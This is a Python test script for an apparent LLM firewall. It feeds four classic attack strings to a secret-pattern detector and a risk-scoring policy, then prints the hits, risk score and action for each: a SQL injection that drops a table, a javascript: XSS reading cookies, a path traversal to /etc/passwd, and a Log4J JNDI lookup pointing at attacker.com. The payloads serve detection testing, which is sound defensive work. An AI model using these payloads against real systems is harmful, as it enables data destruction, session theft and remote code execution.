#!/usr/bin/env python3
"""
TEST MIT SECRET PATTERNS - ADD MISSING DETECTOR
"""
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from llm_firewall.detectors.secret_patterns import classify_decoded
from llm_firewall.policy.risk_weights_v2_otb import decide_action_otb
from llm_firewall.preprocess.context import classify_context

bypasses = [
    ("SQL", "' OR '1'='1'; DROP TABLE users--"),
    ("XSS", "javascript:alert(document.cookie)"),
    ("Path", "../../../etc/passwd"),
    ("Log4J", "${jndi:ldap://attacker.com/exploit}"),
]

print("="*70)
print("TEST WITH SECRET PATTERNS DETECTOR")
print("="*70)

for category, payload in bypasses:
    # Check if secret patterns trigger
    secret_result = classify_decoded(payload.encode())

    print(f"\n{category}: {payload}")
    print(f"  Secret: {secret_result.get('secret', False)}")
    print(f"  Patterns: {secret_result.get('patterns', [])}")

    # Manual hits
    hits = []
    if secret_result.get('secret'):
        hits.append('base64_secret')

    # Add basic patterns
    if 'DROP' in payload.upper() or 'TABLE' in payload.upper():
        hits.append('sql_keyword')
    if 'javascript:' in payload.lower():
        hits.append('xss_scheme')
    if '../' in payload:
        hits.append('path_traversal')
    if '${jndi:' in payload:
        hits.append('log4j_pattern')

    ctx = classify_context(payload)
    action, risk, contrib = decide_action_otb(hits, ctx, text=payload)

    print(f"  Hits: {hits}")
    print(f"  Risk: {risk:.3f}")
    print(f"  Action: {action}")

